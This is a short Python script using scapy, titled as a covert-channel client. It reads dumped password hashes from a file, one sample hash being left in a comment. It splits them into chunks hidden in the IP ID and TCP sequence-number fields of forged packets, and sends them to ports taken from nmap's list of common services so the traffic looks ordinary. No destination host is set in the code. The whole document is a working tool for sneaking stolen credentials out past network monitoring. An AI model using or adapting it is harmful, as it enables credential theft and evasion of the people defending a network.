############################################
#IP ID ISN Covert Client
############################################

from os import popen
from struct import unpack
from scapy.all import *

def sender():
    with open('hash_dump.txt') as f:
        s=f.read()
	print type(s)
	payload = s
	#payload = "$6$XE7c5iDW$n1P1zwjIP04IN5nrxUSHHDbG0Fx.MF0CE1cPq9SAV0.spwbxLwvuNKII.Bom71MBJEVWZ9xQfsZ8yz.vGNAjc."
	print len(payload)

	print len(payload) % 6

	packetN = (len(payload) / 6) + 1
	print packetN


	port_list = popen("grep -v '#' /usr/share/nmap/nmap-services | sort -r -k3 | awk  '{print $2}' | cut -d/ -f1 | head -%s" % packetN).readlines()

	print port_list

	packets = []

	payload += '\x00' * 4

	payload_chunks = [payload[x:x+6] for x in xrange(0, len(payload), 6) ]
	print len(payload_chunks)
	tot_packets = len(payload_chunks)
	print tot_packets
	print payload_chunks

	for i in range(tot_packets):
		ip_id, tcp_isn = unpack("<HI",payload_chunks[i])
		packet = IP(id = ip_id)/TCP(seq = tcp_isn, dport = int(port_list[i]) )
		packets.append( packet )

	send(packets)

sender()
